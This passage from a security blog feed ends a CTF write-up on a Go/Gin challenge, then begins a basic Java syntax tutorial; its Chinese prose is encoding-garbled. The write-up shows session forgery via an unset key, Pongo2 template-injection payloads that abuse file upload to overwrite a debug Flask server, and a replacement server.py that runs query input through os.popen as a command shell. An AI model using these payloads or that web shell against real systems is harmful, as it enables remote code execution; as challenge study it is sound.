class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;html&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‰æ¡è·¯ç”±</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ : è®¾ç½®ä¸€ä¸ªguestçš„å®¢æˆ·ç«¯session</span><br><span class="line">/admin : é‰´æƒæ˜¯å¦ä¸ºadmin, è‹¥æ˜¯, æ¥å—ä¸€ä¸ªnameå‚æ•°, å¹¶ä½¿ç”¨ Pongo2 æ¨¡æ¿å¼•æ“æ¸²æŸ“å‚æ•°å€¼</span><br><span class="line">/flask : è®¿é—®å†…ç½‘çš„flaskæœåŠ¡</span><br></pre></td></tr></table></figure><p>çœ‹äº†é¢˜è§£, è¿™é‡Œçš„os.Getenv(â€œSESSION_KEYâ€), </p><p>SESSION_KEYç¯å¢ƒå˜é‡å¹¶æ²¡æœ‰è®¾ç½®, å¯¼è‡´å¯ä»¥ä¼ªé€ session</p><p>æœ¬åœ°æ­å»ºäº†goç¯å¢ƒ, ç›´æ¥æŠŠæºç ä¿®æ”¹ä¸€ä¸‹åœ¨æœ¬åœ°è¿è¡Œ, è®©ä»–è¿”å›ä¸€ä¸ªadminçš„session</p><p>ä¿®æ”¹indexè·¯ç”±, è¿”å›adminçš„sessionè€Œä¸æ˜¯guestçš„</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span> <span class="comment">/////////ä¿®æ”¹ä¸ºadmin</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240314215648315.png" alt="image-20240314215648315"></p><p>æ‹¿è¿™è¿™ä¸ªsessionå»&#x2F;adminè·¯ç”±é‰´æƒ</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240314220545328.png" alt="image-20240314220545328"></p><p>å¯ä»¥çœ‹è§æ¨¡æ¿å­—ç¬¦ä¸²è¢«æ¸²æŸ“äº†, å­˜åœ¨ssti</p><p>å†çœ‹åç«¯flask</p><p>ä¸ä¼ è§„å®šçš„å‚æ•°name, éšä¾¿ç©¿ä¸ªå‚æ•°è®©ä»–æŠ¥é”™å‡ºæºç </p><p>GET &#x2F;flask?name&#x3D;?a&#x3D;1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> name + <span class="string">&quot; no ssti&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>å¼€å¯äº†debug, ä¹Ÿå°±æ„å‘³ç€æ”¹å˜æºç åæœåŠ¡å™¨ä¼šç«‹å³æ›´æ–°, </p><p>è¿™é‡Œå°±ç”¨åˆ°äº†SaveUploadedFileæ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;c.SaveUploadedFile(c.FormFile(&quot;file&quot;),&quot;/app/server.py&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>c.FormFile(â€œfileâ€)è¿”å›è¡¨å•æ•°æ®ä¸­nameä¸ºfileçš„æ–‡ä»¶, SaveUploadedFileå°†è¯¥æ–‡ä»¶ä¿å­˜åˆ°â€&#x2F;app&#x2F;server.pyâ€</p><p>ä½†æ˜¯è¿™é‡Œæœ‰ä¸€æ­¥htmlç‰¹æ®Šå­—ç¬¦çš„è½¬ä¹‰</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html.EscapeString(name)</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥payloadä¸­çš„å¼•å·ä¼šè¢«è½¬ä¹‰æ‰</p><p>è¿™é‡Œåˆå¼•å…¥äº†c.Request.Referer()æˆ–c.Request.UserAgent()æ–¹æ³•, é¡¾åæ€ä¹‰å°±æ˜¯è¿”å›UAæˆ–è€…Refererçš„å€¼(å­—ç¬¦ä¸²)</p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯HandlerName() æ–¹æ³•ï¼Œç”¨äºè¿”å›ä¸»å¤„ç†ç¨‹åºçš„åç§°ï¼Œè¿™é‡Œè¿”å›çš„å°±æ˜¯admin&#x2F;route.Adminï¼Œå¦‚ä½•å¯ä»¥ä½¿ç”¨lastè¿‡æ»¤å™¨è·å–æœ€åä¸€ä¸ªå­—ç¬¦n</p><p>ä¸¤ç§payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())&#125;&#125;</span><br></pre></td></tr></table></figure><p>å‡†å¤‡ä¸€ä¸ªè¦æ›¿æ¢ä¸Šå»çš„server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    cmd = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    file=os.popen(cmd).read()</span><br><span class="line">    <span class="keyword">return</span> file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>æ–¹ä¾¿èµ·è§, æœ€ç›´æ¥ç”¨ApiPost7è®¾ç½®å¥½http headerså’Œè¯·æ±‚å‚æ•°, ä¸Šä¼ çš„æ–‡ä»¶</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240315001841245.png" alt="image-20240315001841245"></p><p>ä¹‹åè®¿é—®flask,å¾—åˆ°flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240315002025364.png" alt="image-20240315002025364"></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/#go_session">https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/#go_session</a></p><p><a href="https://blog.csdn.net/qq_62068476/article/details/132292872">https://blog.csdn.net/qq_62068476/article/details/132292872</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World&quot;&gt;&lt;a href=&quot;#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 ååŒ—èµ›åŒº Day2 W</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Javaå®‰å…¨åŸºç¡€</title>
    <link href="http://example.com/2024/03/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/03/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</id>
    <published>2024-03-08T12:29:02.000Z</published>
    <updated>2024-03-09T14:24:18.918Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JavaåŸºç¡€è¯­æ³•"><a href="#JavaåŸºç¡€è¯­æ³•" class="headerlink" title="JavaåŸºç¡€è¯­æ³•"></a>JavaåŸºç¡€è¯­æ³•</h1><h2 id="SOUTå’ŒSOUFè¾“å‡º"><a href="#SOUTå’ŒSOUFè¾“å‡º" class="headerlink" title="SOUTå’ŒSOUFè¾“å‡º"></a>SOUTå’ŒSOUFè¾“å‡º</h2><h3 id="SOUT"><a href="#SOUT" class="headerlink" title="SOUT"></a>SOUT</h3><p>ä¸èƒ½ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸², ä½†å¯ä»¥ä½¿ç”¨<code>+</code>æ‹¼æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.print(<span class="string">&quot;hello,&quot;</span> + <span class="string">&quot;world!&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;hello,&quot;</span> + <span class="string">&quot;world!&quot;</span>); <span class="comment">// æœ«å°¾è‡ªåŠ¨è¡¥ä¸€ä¸ªæ¢è¡Œç¬¦</span></span><br></pre></td></tr></table></figure><h3 id="SOUF"><a href="#SOUF" class="headerlink" title="SOUF"></a>SOUF</h3><p>å¯ä»¥ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(<span class="string">&quot;hello,&quot;</span> + <span class="string">&quot;world and %s!&quot;</span>, <span class="string">&quot;you&quot;</span>);</span><br><span class="line"><span class="comment">//hello,world and you!</span></span><br></pre></td></tr></table></figure><h2 id="Scannerè¾“å…¥"><a href="#Scannerè¾“å…¥" class="headerlink" title="Scannerè¾“å…¥"></a>Scannerè¾“å…¥</h2><p><strong>ä¸¤ç§è¾“å…¥æ–¹å¼<code>next()ï¼Œnextline()</code></strong></p><h3 id="next"><a href="#next" class="headerlink" title="next()"></a>next()</h3><p>ä»¥ç©ºæ ¼ä¸ºç»“æŸç¬¦</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(input.hasNext()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> input.next();</span><br><span class="line">            System.out.printf(<span class="string">&quot;hello %s&quot;</span>, str);</span><br><span class="line">        &#125;</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240308204606772.png" alt="image-20240308204606772"></p><h3 id="nextline"><a href="#nextline" class="headerlink" title="nextline()"></a>nextline()</h3><p>ä»¥å›è½¦ä¸ºç»“æŸç¬¦</p><h2 id="forå¾ªç¯"><a href="#forå¾ªç¯" class="headerlink" title="forå¾ªç¯"></a>forå¾ªç¯</h2><p>ä¸Cè¯­è¨€å®Œå…¨ç›¸åŒ</p><h2 id="å¢å¼ºforå¾ªç¯"><a href="#å¢å¼ºforå¾ªç¯" class="headerlink" title="å¢å¼ºforå¾ªç¯"></a>å¢å¼ºforå¾ªç¯</h2><p>è‡ªåŠ¨éå†æ•°ç»„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] numbers = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : numbers) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç±»ä¸ç»§æ‰¿"><a href="#ç±»ä¸ç»§æ‰¿" class="headerlink" title="ç±»ä¸ç»§æ‰¿"></a>ç±»ä¸ç»§æ‰¿</h2><p><strong>å°çŸ¥è¯†</strong></p><blockquote><ul><li><strong>Publicç±»ï¼š</strong> ä¸€ä¸ªJavaæ–‡ä»¶ä¸­åªèƒ½æœ‰ä¸€ä¸ª<code>public</code>ç±»ï¼Œå¹¶ä¸”è¿™ä¸ª<code>public</code>ç±»çš„åç§°å¿…é¡»ä¸æ–‡ä»¶åç›¸åŒã€‚è¿™æ ·çš„ç±»å¯ä»¥ä»å…¶ä»–åŒ…ä¸­è®¿é—®ã€‚</li><li><strong>épublicç±»ï¼š</strong> ä¸€ä¸ªJavaæ–‡ä»¶å¯ä»¥åŒ…å«å¤šä¸ªépublicç±»ï¼Œå®ƒä»¬çš„è®¿é—®çº§åˆ«è¢«é™åˆ¶åœ¨åŒä¸€åŒ…ä¸­ã€‚è¿™äº›ç±»ä¸èƒ½è¢«å…¶ä»–åŒ…ä¸­çš„ç±»ç›´æ¥è®¿é—®ã€‚</li></ul></blockquote><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;I am %s, and I am %d years old.\n&quot;</span>, name, age);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">n4c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;1 year later,&quot;</span>);</span><br><span class="line">        n4c1.setAge(<span class="number">20</span>);</span><br><span class="line">        System.out.printf(<span class="string">&quot;I will be %d&quot;</span>, n4c1.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240308210528171.png" alt="image-20240308210528171"></p><p><strong>extends</strong></p><p>SuperMan.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SuperMan</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SuperMan</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123; <span class="comment">//åˆ›å»ºæ„é€ å™¨</span></span><br><span class="line">        <span class="built_in">super</span>(name, age);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">superPower</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I can do this all day!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SuperMan</span> <span class="variable">n4c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SuperMan</span>(<span class="string">&quot;n4c1&quot;</span> ,<span class="number">19</span>);</span><br><span class="line">        n4c1.superPower();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240308213418330.png" alt="image-20240308213418330"></p><p><strong>implements</strong></p><p>ç•¥</p><h2 id="æŠ½è±¡ç±»"><a href="#æŠ½è±¡ç±»" class="headerlink" title="æŠ½è±¡ç±»"></a>æŠ½è±¡ç±»</h2><p>ä¸phpç›¸ä¼¼</p><p>ç•¥</p><h2 id="æ¥å£"><a href="#æ¥å£" class="headerlink" title="æ¥å£"></a>æ¥å£</h2><blockquote><p>æ¥å£ï¼ˆè‹±æ–‡ï¼šInterfaceï¼‰ï¼Œåœ¨JAVAç¼–ç¨‹è¯­è¨€ä¸­æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»å‹ï¼Œæ˜¯æŠ½è±¡æ–¹æ³•çš„é›†åˆï¼Œæ¥å£é€šå¸¸ä»¥interfaceæ¥å£°æ˜ã€‚ä¸€ä¸ªç±»é€šè¿‡ç»§æ‰¿æ¥å£çš„æ–¹å¼ï¼Œä»è€Œæ¥ç»§æ‰¿æ¥å£çš„æŠ½è±¡æ–¹æ³•ã€‚</p></blockquote><blockquote><h4 id="æ¥å£ä¸ç±»çš„åŒºåˆ«ï¼š"><a href="#æ¥å£ä¸ç±»çš„åŒºåˆ«ï¼š" class="headerlink" title="æ¥å£ä¸ç±»çš„åŒºåˆ«ï¼š"></a>æ¥å£ä¸ç±»çš„åŒºåˆ«ï¼š</h4><ul><li>æ¥å£ä¸èƒ½ç”¨äºå®ä¾‹åŒ–å¯¹è±¡ã€‚</li><li>æ¥å£æ²¡æœ‰æ„é€ æ–¹æ³•ã€‚</li><li>æ¥å£ä¸­æ‰€æœ‰çš„æ–¹æ³•å¿…é¡»æ˜¯æŠ½è±¡æ–¹æ³•ï¼ŒJava 8 ä¹‹å æ¥å£ä¸­å¯ä»¥ä½¿ç”¨ default å…³é”®å­—ä¿®é¥°çš„éæŠ½è±¡æ–¹æ³•ã€‚</li><li>æ¥å£ä¸èƒ½åŒ…å«æˆå‘˜å˜é‡ï¼Œé™¤äº† static å’Œ final å˜é‡ã€‚</li><li>æ¥å£ä¸æ˜¯è¢«ç±»ç»§æ‰¿äº†ï¼Œè€Œæ˜¯è¦è¢«ç±»å®ç°ã€‚</li><li>æ¥å£æ”¯æŒå¤šç»§æ‰¿ã€‚</li></ul><h4 id="æ¥å£ç‰¹æ€§"><a href="#æ¥å£ç‰¹æ€§" class="headerlink" title="æ¥å£ç‰¹æ€§"></a>æ¥å£ç‰¹æ€§</h4><ul><li>æ¥å£ä¸­æ¯ä¸€ä¸ªæ–¹æ³•ä¹Ÿæ˜¯éšå¼æŠ½è±¡çš„,æ¥å£ä¸­çš„æ–¹æ³•ä¼šè¢«éšå¼çš„æŒ‡å®šä¸º <strong>public abstract</strong>ï¼ˆåªèƒ½æ˜¯ public 